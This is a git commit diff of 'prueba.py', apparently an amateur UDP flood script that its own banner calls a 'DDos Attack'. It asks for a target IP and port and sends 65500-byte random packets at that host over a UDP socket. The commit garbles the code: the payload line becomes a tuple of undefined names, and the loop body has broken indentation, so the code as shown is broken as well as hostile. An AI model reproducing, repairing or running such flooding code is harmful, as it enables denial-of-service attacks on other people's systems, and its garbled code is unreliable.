1779ff49f1eedd15d153e16e800cc735c8d0e05c
Fabri15544 <fabriciolomas15@gmail.com>
2019-06-01 20:17:04 -0300

    version 2

--- prueba.py
+++ prueba.py
@@ -9,7 +9,7 @@ target_host = raw_input("IP Target :")
 target_port = input("Port :")
 #packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(65500)
+bytes = thetime, nexmap, random._urandom(65500)
 sock.sendto(bytes, (target_host, target_port))
 os.system("clear")
 os.system("figlet DDos Attack")
@@ -18,9 +18,6 @@ sent = 1
 pysendfile = 0
 while True:
 
- print(sock, target_host, target_port)
-            
-             
-client.send
-target_host 
-target_port 
+print(sock, target_host, target_port)
+  
+    random._urandom(65500)
